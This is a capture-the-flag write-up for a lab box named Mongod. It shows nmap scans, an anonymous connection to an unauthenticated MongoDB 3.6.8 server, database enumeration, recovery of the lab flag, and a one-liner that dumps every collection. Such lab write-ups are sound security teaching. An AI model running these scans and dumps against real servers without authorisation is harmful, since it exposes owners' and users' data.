---
OS: Linux
Level: Very Easy
Skills: MongoDB, NoSQL, Database Enumeration
---
# 👹 Mongod
<div class="machine-properties">
  <span class="prop-badge linux">Linux</span> <span class="prop-badge very-easy">Very Easy</span> <span class="prop-badge skills">MongoDB</span> <span class="prop-badge skills">NoSQL</span> <span class="prop-badge skills">Database Enumeration</span>
</div>


Mongod is a **Very Easy** Linux box that introduces MongoDB — a NoSQL document database running on port 27017. When authentication is left disabled (the default in older versions), an attacker can connect anonymously and enumerate databases, collections, and exfiltrate sensitive data without any exploit.

---

## Recon

A full port scan reveals two open ports — **SSH** on 22 and **MongoDB** on 27017:

```
$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.11.69

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
27017/tcp open  mongod  syn-ack ttl 63
```

A service scan identifies **OpenSSH 8.2p1** on Ubuntu and — most importantly — **MongoDB 3.6.8**:

```
$ nmap -sCV -p22,27017 10.129.11.69

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
27017/tcp open  mongodb MongoDB 3.6.8 3.6.8
```

Key findings:
- **MongoDB 3.6.8** — a version that ships with authentication **disabled by default** (`authorization: disabled` in `/etc/mongod.conf`)
- **SSH on 22** — could serve as a secondary access vector if credentials are found in the database
- **Ubuntu 20.04** — inferred from OpenSSH 8.2p1 Ubuntu packaging; a modern OS running a database with legacy security posture

> 💡 **Why this matters:** MongoDB versions ≤ 3.6 ship with `authorization: disabled` and `bindIp: 127.0.0.1` as defaults. However, many administrators change `bindIp` to `0.0.0.0` (exposing it to the network) and forget to enable authentication — a textbook CTF misconfiguration.

---

## Foothold

### Step 1 — Connect without authentication

MongoDB 3.6.8 uses the legacy `mongo` shell as its default client. Attempt a connection with no credentials:

```
$ mongo 10.129.11.69:27017

MongoDB shell version v3.6.8
connecting to: mongodb://10.129.11.69:27017/test
MongoDB server version: 3.6.8
>
```

The connection succeeds immediately — no password prompt, no authentication challenge. MongoDB is wide open.

> 💡 If the legacy `mongo` shell is not installed on your attack box, `mongosh` (the modern replacement) also works perfectly against older servers: `mongosh mongodb://10.129.11.69:27017`. Install either with `sudo apt install mongodb-clients` (legacy) or `sudo apt install mongodb-mongosh` (modern).

### Step 2 — Enumerate databases

List all databases on the server:

```
> show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
```

Five databases. The names `sensitive_information` and `users` immediately stand out as non-default — `admin`, `config`, and `local` are system databases.

### Step 3 — Explore the `sensitive_information` database

Switch to the most promising database and list its collections:

```
> use sensitive_information
switched to db sensitive_information

> show collections
flag
```

A single collection called `flag`. Retrieve its contents:

```
> db.flag.find().pretty()
{
	"_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
	"flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
}
```

The flag is recovered directly — a plaintext value inside a MongoDB document with no access controls.

### Step 4 — Explore the remaining databases

For completeness, check `users` and `admin`:

```
> use users
switched to db users
> show collections
                    # no collections — database was never populated
> use admin
switched to db admin
> show collections
system.version
```

- **`users`** exists but contains **no collections** — it was likely set up as a placeholder or was never populated
- **`admin`** only contains `system.version` — the default system collection; no user accounts were created here either, confirming the absence of authentication

### Alternative — One-liner dump

If you prefer a non-interactive approach, the entire database can be dumped in a single command:

```
$ mongo --quiet 10.129.11.69:27017 --eval '
  db.adminCommand({listDatabases: 1}).databases.forEach(function(d) {
    print("=== " + d.name + " ===");
    var dbObj = db.getSiblingDB(d.name);
    dbObj.getCollectionNames().forEach(function(c) {
      print("  --- " + c + " ---");
      dbObj.getCollection(c).find().forEach(printjson)
    })
  })
'
```

This iterates over every database and every collection, printing all documents as JSON — ideal for scripting and automation.

---

## Key Takeaways

- **MongoDB ≤ 3.6 ships with no authentication** — always try connecting without credentials first; `mongo <IP>:27017` or `mongosh mongodb://<IP>:27017`
- **`show dbs` is your first command** — it reveals all databases instantly, and non-default names (`sensitive_information`, `users`) are dead giveaways
- **`show collections` + `db.<col>.find()`** — the MongoDB equivalent of `SELECT * FROM table`; once you're in, data exfiltration is trivial
- **SSH on port 22 was a rabbit hole** — no credentials were found in the database that could have been reused for SSH access; the flag came entirely from MongoDB
- **Nmap can help confirm your findings** — `nmap --script mongodb-databases -p27017 <IP>` dumps all database names without even connecting interactively
- No privilege escalation was needed — anonymous MongoDB access exposed the flag directly with no further exploitation required
